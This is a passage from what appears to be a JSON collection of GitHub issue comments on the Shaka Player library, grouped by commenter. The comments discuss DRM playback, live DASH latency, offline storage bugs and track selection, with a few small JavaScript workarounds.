    "rajlaxmi28": "Sorry for delay in response to your comment.\nI have corrected the value of cenc:default_KID attribute in the manifest. It is now equivalent to kid specified in pssh box.\nPublic url:\nManifest : http://115.119.242.22/mm/dash/live/7015/LIVESERVICE_1234/TG_TEST_SD.mpd\nLicense Server - http://115.119.242.22/drmclientproxy/playready/get_license\nThank you for your reply.. Thank you very much for you support.\nNow I have configured to create only video segments for live and tried to play the content in below two situations:\n1. When pssh box is present in mpd, it was playing fine. Even though I am not able to see license call is coming to our license proxy. How is then content is playing without license?\n2. When pssh box is present in media segments (not in mpd and init), then it is not playing though it is downloading segments.\nTo allow key rotation, I need to update media segments with pssh information. Is playback possible for playready content having pssh information in media segments only?\nOne more thing: Now shaka player only supports https content playback. I am not able to play my http content in shaka plater demo app. Could you please provide any idea on how to test my content in shaka player? \n. Thank you very much for your support. It helped me a lot.\nI will try to run a local copy of shaka player to check key rotation playback for playready.. As the issue [link to https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/11016936/]  seemed fixed, I tried to play a video only live content protected by Playready and has key rotation enabled. Content has pssh box in media content and ContentProtection Descriptor element in MPD; no pssh box in init segment.\nWhen playing the content in Microsoft Edge, Shaka-Player is giving error \"Shaka Error DRM.FAILED_TO_GENERATE_LICENSE_REQUEST (InvalidAccessError) -- The CDM was unable to generate a license request for the init data it was given. The init data may be malformed or in an unsupported format. \nerror.data[0] is an error message string from the browser.\" \ncontent url: http://111.93.150.213/mm/dash/live/7015/LIVESERVICE_1234/TG_TEST_SD.mpd\nlicense server url: http://111.93.150.213/drmclientproxy/playready/get_license. @joeyparrish I am using latest version of Edge (Microsoft Edge 41.16299.248.0).. Hi Joey,\nIs there any update on this issue. For your reference i have provided public url to content.\ncontent url: http://111.93.150.213/mm/dash/live/7015/LIVESERVICE_1234/TG_TEST_SD.mpd\nlicense server url: http://111.93.150.213/drmclientproxy/playready/get_license\nPlease provide your feedback on this issue.. Thank you for your response.. That would be very helpful. Much appreciated.. ",
    "molethiaz": "Hello again,\ni just downgraded shaka-script in sender & receiver app to V 2.0.2 and now i get no error anymore. \nI saw method 'getPlayheadTimeAsDate' is not in PlayerGetterMethods Array: \nhttps://github.com/google/shaka-player/blob/v2.0.2/lib/cast/cast_utils.js#L105\nA workaround may be:\nshaka.cast.CastUtils.PlayerGetterMethods.forEach(function(name) {\n    if(typeof (this.player_)[name] === 'function') {\n        update['player'][name] = /** @type {Object} */(this.player_)[name]();\n    }\n }.bind(this));. ",
    "radiantmediaplayer": "Thanks @ismena for your reply. I understand. We are good now with what we have based on shaka 2.0.*. I will review the changes for the new audio/video track management when it is officially released. If I have any question with the new system I will open another issue.. @joeyparrish I did contact Nimble streamer team and you can find their feedback above. I understand this is a grey area but as @alexpokotilo mentioned our concern is that this stream plays fine with other, notable, DASH-capable players. Shaka is a great DASH player and we find it much easier to deal with and more stable than other DASH capable players we have tested and used. I will get back to our user and explain a workaround in the meantime. . @joeyparrish that is allright. Your approach makes sense and we are happy with the features and stability that shaka 2 is currently bringing. We have a workaround for this specific content so I am closing now.. We (happily) use Shaka player in our player and started recently to support fmp4-HLS with it. We have a complete different player for iOS using native src though, notably due to the fact that video ads work differently on iOS (e.g. src needs to be changed on each ad break). However if you can crack FPS on iOS Safari we would be more than happy to test Shaka player on that aspect.. Could be related but this issue is specifically for live DASH streaming (not HLS live which I have not tested yet).. If this is an issue with encoder drifting previous versions of Shaka player were able to correct the drift. I have put online examples to replicate the issue:\nhttp://rmp-staging.com/shaka/test223.html\nhttp://rmp-staging.com/shaka/test224.html\nI am now able to tell that the issue was introduced in 2.2.4 release. I am testing in latest Chrome for Win 10.  If you are seeing the same thing I see you will see that DASH Shaka Player History live stream in 2.2.3 starts and does not show warning logs. The same test with 2.2.4 shows that the stream does not start and warning logs can be found:\n\ncannot find segment: currentPeriod.startTime=0 lookupTime=2397022.5883333683\n\nTesting another live DASH stream (http://irtdashreference-i.akamaihd.net/dash/live/901161/bfs/manifestARD.mpd) I can see that both 2.2.3 and 2.2.4 are able to display it correctly. \nOur functional tests are not allowing to update to a version above 2.2.3 due to this issue. But if you can confirm this is an issue with the DASH Shaka Player History live stream then we can use another test vector for our tests.. @joeyparrish thanks for fixing this.. ",
    "TigerHuang": "console debug logs\n\n. I just try the last commit 56f6ef43940a8756e3d77d7fa564cad055dcd1a7 this bug still exist. ",
    "beaufortfrancois": "@ismena I've addressed your feedback.. I've added missing externs.js files in https://github.com/google/shaka-player/pull/689/commits/aa693a9792cca266b68053de81e6297d6144fa39 but it looks like tests are still failing for the play promise:\n```\nChecking the tests for type errors...\n./externs/mediaelements.js:29: ERROR - variable HTMLMediaElement.prototype.play redefined, original definition at externs.zip//html5.js:1700\nHTMLMediaElement.prototype.play = function() {};\n^\n1 error(s), 0 warning(s)\nBuild failed\n```\nI'd appreciate some help there.. @TheModMaker Done! Thanks ;). Yeah! Please let me know when it's live @TheModMaker!. I can reproduce as well. I always had \"Disable cache\" checked hence why I didn't see it.\nI'll investigate. Thank you for testing it out!. I think I understand what is happening there... video_.load() is called after ShakaPlayer has initiliazed video and set media source. When player.load(asset.manifestUri) is called, it checks that the mediaSource.readyState is equal to open. This assertion is not always true as video_.load() resets the entire media state. And here's what is happening: A sourceclose event is triggered sometimes after sourceopen making readyState equals to closed.. Maybe @wolenetz has some ideas about to solve that issue. Ultimately, we may have to catch video.play() anyway.. I think we can close it for now.. Thank you ;). I've reset site setttings and I can still reproduce.\n985 works great now!. Where can I access the nightly build?. I can no longer reproduce the issue.\nThank you @joeyparrish and @avelad.. And I've just realized an \"Offline asset\" has been added to the dropdown list...\nI believe this makes my issue WAI.. I'm closing this issue and updating the existing PR: https://github.com/google/shaka-player/pull/995. I believe it is now fixed. @joeyparrish WDYT?. @joeyparrish I've tried your approach in https://github.com/google/shaka-player/pull/1008/commits/feb1d87119ab0ea0a3a951e08ab4f1b6e620fe0a. WDYT?\n\n. @TheModMaker @joeyparrish WDYT of https://github.com/google/shaka-player/pull/1008/commits/c8b5c0707a7679bfa4b64848675288eadfccef67?. Noted. Thanks for the explanation Joey.. @joeyparrish Here it is: git grep -l \"'//\" | xargs sed -i \"s/'\\/\\//'https:\\/\\//g\" in docs/tutorials. That's great to hear!\nFYI @chcunningham @mounirlamouri. FYI @ygoto3. @avelad Do you mean the PiP button is not visible or video doesn't go in PiP when you click button?. Can you share a screenshot?. Thank you @avelad!\nWhich version of Opera do you use?. Did you enable some flags?. In that case, I believe Opera folks didn't test/implement Picture-in-Picture API and that they should disable it in the mean time as it confuses users. I'll try to contact them to let them know.\nThank you @avelad for your help!. @avelad As you can see at #1724, A stable version of Opera with the Picture-in-Picture fix included was released yesterday: https://blogs.opera.com/desktop/2018/12/opera-57-0-3098-102-stable-update/. I've reverted the year.. Opera folks told me it will be fixed in next stable (58).\nThey're not sure if it will make it to next stable update (57).\nFor info, Opera internal bug id is DNA-74390. It may be helpful if you contact them so that they know what you're talking about.\n. A stable version with the Picture-in-Picture fix included was released yesterday: https://blogs.opera.com/desktop/2018/12/opera-57-0-3098-102-stable-update/.\n\n57.0.3098.102 \u2013 2018-12-13 blog post\n- DNA-74033 Crash at BrowserProcessImpl::Unpin()\n- DNA-74077 Crash at base::Value::Value(base::flat_map const&)\n- DNA-74180 [Mac] Crash at opera::BrowserSidebarItemViewViews::UpdateTooltip()\n- DNA-74245 [O57] web3.js downloaded with flag disabled\n- DNA-74346 Fix performance problems with extensions blocking feature\n- DNA-74390 Disable official PiP (picture-in-picture) or implement a UI for it\n. I don't.\nMaybe @bratell-at-opera knows.. I was thinking about future use of the play promise so that people don't have to refactor the Media Session part and could simply add their code when play promise is resolved. Does that make sense?. You're absolutely right. I've updated patch.. Done.. Done in https://github.com/google/shaka-player/pull/1001/commits/e3af7f17674d23d3a8772a5c1e828b617bd81b81. You're right. I'll revert.. See https://www.paulirish.com/2010/the-protocol-relative-url/ and https://google.github.io/styleguide/htmlcssguide.html#Protocol. You can also have a look at  b/31773284 and b/73454807. Since iOS is not supported yet*, I'll revert for now.. \n",
    "rounce": "Why remove useful functionality? I'm sure in many cases it's necessary for independent change of tracks. In my case it remains to make a fork or to use the previous version forever.. selectAudioLanguage might be useful in some cases. But often I have several different audio tracks of one languarge. Thanks. I will make fork.\n\nThis would mean that we would either have to throw an error for the change, ignore the change, or also switch video\n\neither add parameter to selectVariantTrack or change second parameter. Many options to keep the functionality, without disturbing the logic of hls.. Thanks.. I did it this way:\n```javascript\nlet fetch = shaka.net.HttpFetchPlugin.fetch_;\n  let promise = fetch(uri, init).then(function(response) {\n    clearTimeout(timeout);\nlet headers = {};\n/** @type {Headers} */\nlet responseHeaders = response.headers;\nresponseHeaders.forEach(function(value, key) {\n  // Since IE/Edge incorrectly return the header with a leading new line\n  // character ('\\n'), we trim the header here.\n  headers[key.trim()] = value;\n});\n\nconst reader = response.body.getReader();\nlet loaded = 0;\nreturn new ReadableStream({\n  start(controller) {\n    reader.read().then(function processData(result) {\n      if (result.done) {\n        controller.close();\n        return;\n      }\n      controller.enqueue(result.value);\n      loaded += result.value.byteLength;\n      // progress = loaded / sizeTotal\n      return reader.read().then(processData);\n    });\n  }\n});\n\n})\n  .then((stream) => new Response(stream))\n  .then((response) => {\n    return response.arrayBuffer().then(function(arrayBuffer) {\n      return shaka.net.HttpPluginUtils.makeResponse(headers,\n          arrayBuffer, response.status, uri, response.url, requestType);\n    });\n  })\n  .catch(function(error) {\n...\n```. ",
    "albertcsm": "Reproduced with v2.0.5 and latest commit today (3cd2506). Sorry, I am not be able to host the MPD right now.\nMaybe I can help verify the fix or I can publish the stream to some external WebDAV server.. The problem seems solved in the master branch, thanks.\n. I signed it!. OK, I will provide two versions of the manifest that has segments removed for retention. I wasn't able to reproduce the issue at this moment, actually it is not easy to hit the issue.\nAnyway, I attached the sample manifests from my encoder. The two manifests are consecutive snapshot of the manifest, with 4 seconds between them. Some segments from period 17 were removed in the second manifest.\nmanifest-5159.txt\nmanifest-5202.txt\n. @TheModMaker I am not sure if startNumber is really required for $Time$ based mpd. I see that another sample asset in Shaka (Wowza / Big Buck Bunny (Live)) also removes segments from MPD in the same way, and there is also no startNumber.\nbig-buck-bunny-1.txt\nbig-buck-bunny-2.txt. I have added a unit test, please check, thanks.. @TheModMaker Oh yes, thanks for pointing out, I was making the change over a mounted folder on a Windows desktop... I have fixed it and added the PR link.. I think resumeAt is used to mark the segment time that need to be append to the buffer (aka timeNeeded) rather than the playhead. Please correct me if wrong.\nSo setting the resumeAt to Math.max(playheadTime, resumeAt=0) would \"timeNeeded\" jump backward.. @TheModMaker I agree it is better to move the \"setting it to 0\" to the end, would you like me to update the fix?. Thanks. Here is a sample asset:\nDASH.zip\n. Yes, it is the same as #1464 . ",
    "kloertm": "I updated my manifest to be like this:\nhttp://pastebin.com/ax2TkWdh\nThe stream is live. (in my test, mpd is updated on-the-fly, so the total duration and segment will change)\nI tried hack minimumUpdatePeriod to update mpd more quickly (every 1s)\nin file shaka.dash.DashParser.prototype.setUpdateTimer_ (set interval always be 1)\nand also make sure suggestedPresentationDelay is 0s.\nand I also hack shaka.media.SegmentIndex.prototype.find in lib/media/segment_index.js\nshaka.media.SegmentIndex.prototype.find = function(time) {\n  // we always use last item to reduce latency.\n  var r = this.references_[this.references_.length - 1];\n  return r.position;\nto always return last timeline segment.\nbut the real latency is still 7 ~ 9 seconds, I have no idea why, I think if latency is 4s, that is acceptable.. by setting the suggestedPresentationDelay to be 0s.\nI still have 5 ~ 6 seconds at the live edge using demo app.\nthis is how I benchmark the latency. (you can see the image below)\nI compared real-time snapshot with dash player.\nhttp://i.imgur.com/GPGjKqq.jpg\nyou can see the buffered time is 3s on the demo app.\nhow can I set the playhead always on the ahead of buffer ?\nI don't need buffer actually.\nMy hope is to reduce the latency as much as possible. Thank you.. I just found that buffer is in html5 video.\nso I think that's minimum buffer required.\nclosing this issue, Thank you.. ",
    "vaage": "@ismena I can look into it.. I have been able to repo this using a Pixel XL running Android 7 (N) and Chrome 57.\nSince I did not have a single large piece of content, I was able to repo this by download each piece of test content. It finally froze at 43% on \"Tears of Steel (external text)\".\nConsidering I still have over 15 GB free on this device, I do not think this has to do with any relative storage capacity, but something specific about the amount of content we are storing.. Using \"navigator.webkitTemporaryStorage.queryUsageAndQuota\" on Android Chrome I have been able to confirm that we are reaching the max storage allotted to us. I am still looking into where the failure is and why we are not getting the error message.. Hello @phamduongnhatnam , Thanks for checking in on this again. I am still working on this but got a little side-tracked with another task. I am currently working up the stack trying to find where the failure is. Currently IndexDB always succeeds and there are never any dangling inserts left open - so the failure has to be somewhere else.. Hello @phamduongnhatnam , Good news we found the problem and it is something we can and will fix. Just so you know the full story. The hang was caused because the transaction never called oncomplete or onerror. What we overlooked was that it is possible for a transaction to call onabort. It appears that when store.put cannot write to disk the request will call onsuccess but the transaction will call onabort.\nWe will be updated our code so that if the transaction is aborted it will appear as an error to Shaka Player and should surface the same as any other error.\nThanks again for finding this and being patient while we looked into it.. @phamduongnhatnam I was able to improve the delete performance. Please run this through your benchmarking and let us know if it meets your expectations.. Hello @raeesbhatti, If I understand you correctly, you have a JSON object that you want to convert to a manifest for Shaka Player to use. We do support custom manifest parsers, which I think would solve your problem. Have you looked at our tutorial on how to make your own manifest parser (https://github.com/google/shaka-player/blob/master/docs/tutorials/manifest-parser.md)?. @shabab11 Since you comment does not relate to this issue, please file a separate issue.. @avelad Thank you for checking in. Your interest is appreciated.\nWe have designed a foundation that will allow us to support both src= and media source while improving how we handle the player's internal state. We built a proof of concept to test the idea and now are currently refining the key components and putting them through our normal code review process.\nOur goal is to first rebuild the current loading system with our new foundation (resolving #1570) and then add the new load path (which should be much easier after the rebuild).. Hello @dmunozpolo, as explained by @joeyparrish in issue #1570, it will be fixed by the work being done for #816. We moved #1570 to the backlog so that it would not be assigned dedicated resources.. Work on #816 is my main priority, it is requiring large changes to how the player works and is requiring a lot of design, implementation, test, and review time. Before of that, it is hard to commit to a specific ETA.\nThe design and implementation of the underlying framework is finished. Right now it is going through review and testing. The integration between the framework and the player is where we are spending most of our time now. Some parts are in review while others are still being planned. The part that is holding up the integration is all the little details that we did not anticipate.\nWith the current velocity, we look to be wrapping this up end of Q1 start of Q2. As in the past, we thank everyone for their patience while we tackle this massive change.. @sirpy Thanks for checking that but unfortunately I believe this is still a browser limitation. hls.js transmuxes TS into MP4 and Shaka Player has made the decision to avoid transmuxing in their player so there is not much that can be done.. Thanks for mentioning that. I will take a look at it too.. Work has been made over time and the immediate code health issues have been resolved. Closing this issue now. . @kuznetcoff777 \"needs triage\" just means that we (the Shaka team) needs to go over it and allocate resources, determine milestones, etc.. @kuznetcoff777 The answer to your question \"Can you please confirm that shaka player takes info about timecode from SEI_RBSP?\", Shaka player does not directly read timecode information from SEI_RBSP. Shaka Player does not get any information directly from the codec. Shaka Player only gets information from the manifest and then passes buffers to Media Source Engine. From there the browser is responsible for handling all codec related information.. @prasadkhambete What happens if you try accessing it via https (your example is using http)?. @lelikg, error 6014 means  the license has expired. This is triggered when playback is stalled on a 'waitingforkeys' event. For the information you have provided, it sounds like you have an expired license and without a valid license, Shaka Player can't play the content.\nDoes this only happen when you play a specific piece of content or for all your content?. Hello @mlondon1, out of the box this is not possible. However, you can import Shaka Player into NodeJs as long as you fake certain media objects - for example the video object.. Hello @mlondon1, out of the box this is not possible. However, you can import Shaka Player into NodeJs as long as you fake certain media objects - for example the video object.. Shaka Player depends on the browser to handle all media functions. In order for ShakaPlayer to run without a browser it needs those objects and functions faked. I have talked with another engineer on the team and the three main objects that you would need to fake are:\n\nVideo\nMediaSource\nSourceBuffer\n\nLastly you could need to import a node module that implements xhr to handle networking requests.. Shaka Player depends on the browser to handle all media functions. In order for ShakaPlayer to run without a browser it needs those objects and functions faked. I have talked with another engineer on the team and the three main objects that you would need to fake are:\n\nVideo\nMediaSource\nSourceBuffer\n\nLastly you could need to import a node module that implements xhr to handle networking requests.. An option I failed to mention before is to use Karma. We use Karma to run all our tests. If you look at our build/test.py and karma.conf.js you can see how we configure Karma to run our tests.. An option I failed to mention before is to use Karma. We use Karma to run all our tests. If you look at our build/test.py and karma.conf.js you can see how we configure Karma to run our tests.. We are in the process of updating the build bot, this failure has to do with some of the changes we made and not your change.. Could you rebase your change on top of master? We updated build/test.py and that is why the build bot is failing to build right now.. @ismena The build bot is happy with this change. Can I pass this back over to you to finish up with?. @ismena I am not ready to accept this change for two reasons:\n1. There is no test that reproducibles the original problem. I would like to see a test that shows that the ABR system will adapt between roles without this fix and show that it won't with this fix. Without that we cannot assert that this change fixes that problem.\n2.  This only part of a bigger problem. In #918 I point that a problem in how ABR could change between languages. I feel that this change is only treating a symptom and not treating the root problem.. @bhh1988 I have been working on addressing #858. We have a change in review right now and it we have been going back-and-forth on it a lot - so don't worry about trying to resolve that.\nThank you for adding more tests, I will take a look at them today.\n@joeyparrish could you answer the question relating to this in #947? It requires more historic knowledge than I have.\nI will also talk with @joeyparrish about how we want to address the root issue.. @bhh1988 I have talked with @joeyparrish and it looks like we are going to take on this issue in-house as it ties into a larger problem. We thank you for identifying this problem and I assure you that we will resolve this issue promptly.. @mikesalvia Is this still an issue you are facing? If so, please take a look at what @joeyparrish is asking so that we can continue to help resolve this issue. If it is no longer an issue, please let us know so we can close the issue or feel free to close the issue yourself. Thanks.. Everything looks good to me.. Hello @ArturoCanizares, I feel like I am missing some context for this issue. Is there another issue on GitHub related to this one or another communication with the Shaka Play team that we do not see here?. @kuznetcoff777 Could you open a separate issue for the problem you found with repo steps? It will be easier for us to track as a bug separate from the original enhancement.. A small update on this.\nTextTrack.cues is only null when mode is set to \"disabled\". As we can see in the initial post, the current text track that the displayer is set to \"disabled\". This explains why we are getting a null list of cues.\nWhat I am still looking into is why the track is being set to \"disabled\" in the first place. When toggling close captions on and off, the track is set to \"hidden\". So at some other point, someone is setting mode to \"disabled\".. @joeyparrish You are right. Once we change over to use the default browser built-in controls, it uses \"disabled\" instead of \"hidden\".\n@SemihGk Thank you for bringing this to our attention. I will get a fix put together today.. Hey @joeyparrish, once this is done, it looks like you may be able get rid of ManifestDB and all its associated types (StreamDB, SegmentDB, and SegmentDataDB.) and replace them with Manifest and its associated types (Stream, Segment, SegmentData).. This appears to be a problem with the WebM file. It does not appear to be set-up to stream properly. When I package the content with the Shaka Packager, I can get it to work but it does restructure the WebM file. If I manually change the manifest created by the shaka packager to use the original file (updating values as needed) it will fail with errors about the WebM content.. @kuznetcoff777 I see the problem you are talking about, but I don't understand how this would happen under normal use. In what scenarios would you be re-configuring the player while it is playing back content?. @kuznetcoff777 , I would suggest opening a separate issue for delaying the change from SD to HD as that increases the scope of this issue and enters into the space of an enhancement.. @kuznetcoff777 I have submitted a fix for the bug into master. However I am going to keep this issue open until I add tests to ensure we do not regress in the future.. There appears to be a large gap at the start of the content. If you enable jump large gaps in the shaka player configuration, the content will play. The content will also play if you seek further into it with jump large gaps disabled.. If you open up the console you should see a message \"Ignoring large gap at 0\". If you enable \"Jump large gaps\", the content can play. For more information on how gap jumping works in Shaka Player check out shaka.media.Playhead.prototype.onPollGapJump_ in shaka-player/lib/media/playhead.js.. Thank you for bring this to our attention. This is a duplicate of #991. We have a fix in progress for it.. @joeyparrish Could you take a look at this request and schedule it for a milestone if it is something we want to take on?. @yairans, thank you for brining this to our attention. I have successfully repo the issue and will start working on a fix.. When prepping examples for reporting bugs I found that there seems to be some problems with our code which is causing some problems on Firefox.\nSo if I set the current time to duration on raw HTML 5 video element, there are no problems, but when I do it with shaka player, Shaka player is failing an assert.\nI am reopening this until I have a more in-depth explanation of what it happening.. @OrenMe  Still working on this issue but have not been able to put much time into it over the last week. I do not have anything new to report.. @OrenMe I was able to put some time into this today. I was able to address some problems with seeking to duration on Firefox, but it does not resolve the problems you and @yairans are interested in.\nWorking with raw Media Source, I was able to get behavior closer to what @yairans asked for so I believe the problem is in shaka.media.StreamingEngine. However this is the most complicated class in the project. I will need to sit down with @joeyparrish when he is back in the office to discuss how we want to handle this issue.. @joeyparrish This looks like a fair request. I feel it is enough work to be labeled as an enhancement. Can you schedule it? I would be happy to take this one on.. @mateon01 After reviewing this issue, there seems to be some contradicting information that I hope you can clear up for me. Right now the bug title specifies Android 5 based on information from a duplicate bug #1027. In your repo steps you say you have done this on Android 4, 5, 6, 7. Is this an issue only on Android 5 or on all Android versions?. @mateon01  I'll have to sync-up with Widevine's Android test engineer as we don't have the devices to reproduce this right now.. @mateon01 The example you are using not the correct way to handle licenses for offline content. You cannot just cache a license and replay it later - that would expose the DRM system to replay attacks. If you wish to have offline playback you need to use persistent licenses. We suggest that you use Shaka Player's built-in offline support rather than the PWA example you are using.. @mad-gooze I am afraid that I do not understand your question. Could you please provide some clarification. Are you asking is there a way to know what segments are available on the server for a given live stream when looking at a DASH manifest - or are you asking at any point during playback know what segments have been downloaded and are therefore available to the player at that exact point in time?. @mad-gooze Was @joeyparrish able to answer your question? If so feel free to close the issue.. @ivivona Could you provide more information? Is this in your app and you just looking for a way to start from the start of the video regardless of it being live? Or are you trying to prepare content for use in someone else's app and need a way to signal to them that they should start at the start and not the live edge?. @ivivona When you load a manifest (shaka.media.player.load), there is an optional parameter you can set called opt_startTime. If you set that to 0, does it solve your problem? That would be the simplest way to ensure that the player always starts playing the content from the start.. @ivivona Was @joeyparrish able to answer your question? If so, feel free to close the issue.. @avelad Could you send us the content you are using via shaka-player-issues@google.com so that we can reproduce this issue? Without it we won't be able to effectively look into this.. @avelad Thanks. Once you get us content that we can use, we will take a look into this.. @Lewis945 I have looked through the content you sent us and I have found what I believe to be the issue. It appears that your last media playlist is setting audio and video to audio. If I remove the entries for Manifest6 I can get video. I also looked at what Streaming Engine was trying to stream and both were video and audio streams were actually audio.\nBehind the scenes Shaka Player sees that you have an entry for video and audio, and discards all the video-only entires. It then goes to play that variant and since it only has audio codecs, it plays the audio.. @kuznetcoff777 We always stream subtitles so that when someone enables them, they are immediately present. If we did not do this, they would have to wait for the subtitles to be available. Since subtitles consume so little bandwidth we feel that this minor cost in bandwidth usage is a minor price to pay for user experience.. @joeyparrish Is not in the office right now. It is his call. Once he is back in the office I will talk to him about it.. @yairans I am sorry to inform you but we have stopped officially supporting Safari 9. Our current support is for Safari 10 to 11.. @adgllorente I am syncing up with our test team to repo this bug.. This appears to be a Chrome problem and they are already looking into it. https://bugs.chromium.org/p/chromium/issues/detail?id=751780#c4. @adgllorente We were not able to reproduce this issue. As chrome is aware of issues with USB audio (see the bug above) there is little we can do.. @noedod Could you provide any more information about errors you are seeing in the log or anything else that can help us help you? As we don't have any ASUS devices, there is no much we can do without more information.. Closing due to inactivity. @kuznetcoff777 please feel free to reopen this issue if your question has not been answered.. @avelad I see that there has not been any updates on this issue in a while. Is this still an issue for you?. @avelad I wanted to chime in again to let you know that I am still working on your request. I am sorry it is taking so long. The challenge I am working through is that there is future work that we are trying to balance with this and trying to make sure that our solution for this is strategically aligned with the design changes ahead.. @avelad , once again I am sorry this is taking so long to complete.\nI am separating out the \"enhancements\" you are asking for as their own issue. This will make it easier to track and keep top-of-mind. This will also allow us to close this \"bug\".\nThe new issue is #1669. I have done my best to fill out what I think it the bigger issue at hand. Please feel free to add to it if you feel I have missed anything.. Closing due to inactivity. @matenadasdi please feel free to reopen this issue if you question has not been answered.. @jeremypress Please use the provided issue template so that we can have all the information we need to reproduce the issue in full.. Thanks @jeremypress. I am going to leave the \"waiting for response\" label until we get the manifest.. @jeremypress I was able to reproduce this with and without Shaka Player. Unfortunately this appears to be a problem with Safari's media source implementation so there is no much we can do. We will file a bug against Safari and update this issue with a link to it once it is filed.. @OrenMe In your email you mention that this content can be played by other players - I tried to play it with the players you mentioned, and it does not play. Are you sure that this content is suppose to be valid?. Thanks @OrenMe, I was able to reproduce it playing on other players and not on ours. I have added it to our bug queue and we should be able to get to be soon.. Thank you @gesinger for filing that for us.. Was able to reproduce this. The error message \"'Mistakenly ignoring deferred variant from the same period!'\" appears. It looks like trying to set the variant at the start causing problems with our deferred switching.. I have looked a little into this. Just to add a note so that we all know this, even if we wait for the load to succeed and then set the variant, this still does not work. However we avoid the error/assert when we do it this way.. @kocoten1992 I was able to get this to work. As you will see I have changed the label from bug to question as things are working as intended but we have not properly explained how to work with this feature. To ensure this does not cause anyone else any problems I will write a tutorial explaining how to work with this feature.\nTo help you get unblocked I will attempt a condensed explanation here. I had to make a couple small changes to your code:\n```\nplayer.configure({abr: {enabled: false}});\nplayer.addEventListener('error', onErrorEvent);\nplayer.load(manifestUri).then(function() {\n  var track = player.getVariantTracks().filter(function(track) {\n    return track.width === 1920 &&\n               track.videoCodec === 'vp9' && \n               track.audioCodec === 'opus';\n  }).pop();\nif (track) {\n    console.log('Selecting variant track ', track);\n    player.selectVariantTrack(track, true);\n  }\n}).catch(onError);  // onError is executed if the asynchronous load fails.\n```\nThe first change was to move the configure before streaming starts. I did that just because there is no reason to wait and if anything it ensures that everything is set-up the way you want before the player starts working with the configuration.\nSecond, instead of waiting for the streaming event, I moved the \"core\" logic to a promise pending on load.\nThirdly, I had to pass true along with selectVariant to force streaming engine to drop the segments it had loaded. If you don't do this, it will continue to use the segments it had already loaded (which were the lower abr option).\nDoes that help?. Closed due to inactively. @mimse, please feel free to reopen this issue later if this is still an issue for you.. @jpmedley Thanks for finding that oversight.. Closed due to inactivity, @buggles333, please feel free to reopen this issue if it is still an issue for you.. Just as a note on this, because it has been sitting for a while and I saw @TheModMaker reference it in another #1818. We made a proof-of-concept internally, but we never settled on an actual \"best practice\" position.  I don't think it has been documented here, but as @TheModMaker commented on in #1818, the UI may be used as part of ad integration.. @joeyparrish What were you hoping to find in the debug log? I don't see anything that stands out to me.. Closing due to inactivity. @noedod, please feel free to reopen this issue if your issue has not been resolved.. @joeyparrish Do you want the parallel downloads tutorial as part of 2.3 or 2.4? I slotted the issue for the tutorial for 2.4.. @avelad based on your screenshot, it appears your content has not been set up for CORS. If you enable CORS on your server, what happens?. @avelad When I try to run your content, I get errors about no access control allow origin. Unless CORS is set-up correctly on the server us to test with, we won't be able to look into this issue.. Thanks @joeyparrish.\nWhen I run your content what I see is:\nUpdating manifest...\nhls_parser.js:1182 First segment dvb_txt-video=499712.track_id=10000-9383262.m4s starts at 26304.347555555567\nhls_parser.js:1182 First segment dvb_txt-audio_20000=160000.track_id=20000-9383262.m4s starts at 50044175.87422225\nhls_parser.js:1182 First segment dvb_txt-video=599040.track_id=10001-9383262.m4s starts at 26304.347555555567\nhls_parser.js:1182 First segment dvb_txt-DVBTXT_TTML_fra_5888=10000.track_id=30002-9383262.webvtt starts at 11436.54077777778\nstreaming_engine.js:1305 (audio:2) looking up segment: presentationTime=11511.904177904129 currentPeriod.startTime=0\nstreaming_engine.js:1305 (video:8) looking up segment: presentationTime=11511.931177854538 currentPeriod.startTime=0\nWhich is similar to what your screenshot showed, however it looks like to me (and maybe @joeyparrish) can comment on this too, is that your content times do not line-up with the presentation, so the player is stuck waiting for your content to start. @joeyparrish is that accurate?. @boredom2 is the stream down? If so, @joeyparrish how do you want to proceed with this?. Right now we have DBEngine.deleteDatabase which deletes the database. What is missing from that to meet the requirements of this issue?. It would have to be on StorageEngineFactory as IStorageEngine would require you to create an instance of the database you are asking to delete.. @michellezhuogg could you take a look at this issue as you are more familiar with the trans-muxing code?. @joeyparrish Could you take a look at this request?. Looks good to me. Thanks for fixing this.. @fujunustc Could you clarify what you mean by tile aggregation?. We have removed the upgrade code using this list of CLs:\n965dc8e1007324540c0ce885c5c346be3b9b3ea4\nc168ee86ad61ae856d4d71cee6264622c151db91\n9e89a90d3cdbe5c13eb9b2f8e11612b99a739894\n4147e77f051fea715a5939da29de2ce632235926\nbd2b163743c0fcc8ddc358f916a4356d0b1cdf04\nWith these CLs, if your storage needs to upgrade, the storage operation will fail with the error UNSUPPORTED_UPGRADE_REQUEST. If you catch this you can delete the database backing storage by using shaka.offline.Storage.deleteAll. In the error, data[0] will have a list of original content uris so that you can re-download all the content again.\nTo get updates on progress on supporting older storage version, please follow #1248.. @joeyparrish could you take a look at this?. The conversion from Blob To BufferSource can be done in MediaSourceEngine, allowing Blobs to be used everywhere else.. @joeyparrish ?. UPDATE\nWe have removed the upgrade code using this list of CLs:\n- 965dc8e1007324540c0ce885c5c346be3b9b3ea4\n- c168ee86ad61ae856d4d71cee6264622c151db91\n- 9e89a90d3cdbe5c13eb9b2f8e11612b99a739894\n- 4147e77f051fea715a5939da29de2ce632235926\n- bd2b163743c0fcc8ddc358f916a4356d0b1cdf04\nWith these CLs, if your storage needs to upgrade, the storage operation will fail with the error UNSUPPORTED_UPGRADE_REQUEST. If you catch this you can delete the database backing storage by using shaka.offline.Storage.deleteAll. In the error, data[0] will have a list of original content uris so that you can re-download all the content again.. @odedhutzler saving content in the service worker is not recommended. Shaka Player has an Offline API and we strongly suggest using that instead of doing it yourself in a service worker. The Offline API will handle saving the content and license.\nWe have a tutorial on working with our offline api here.. @boredom2 Thank you for finding this. \nI was able to confirm that all the links on https://cdnjs.com/libraries/shaka-player for version 2.3.1 all return 404.\nI was able to confirm that the version string on the Google CDN is \"v2.3.1-dirty\".\nSince @joeyparrish handles all our releases, I will talk with him about this. I'll label this as a bug.. @boredom2 I was able to reproduce your issue using @BucherTomas suggestion of using FireFox (thanks).\nI can confirm that after the initial buffered content, it seems to no longer be able to buffer the next segments. When I look at the logs I see:\n(audio:2) update_: playheadTime=11729.85899567604 bufferedAhead=0\n(audio:2) next position unknown: nothing buffered\n(audio:2) looking up segment: presentationTime=11729.85899567604 currentPeriod.startTime=0\n(audio:2) cannot find segment: currentPeriod.startTime=0 lookupTime=11729.85899567604\nSo the problem lies with not being able to buffer the content, but I don't know why. I am gonna have someone else look at your manifest to see if there is an issue there before digger further into the player.. @boredom2 When if request your manifest, even if I 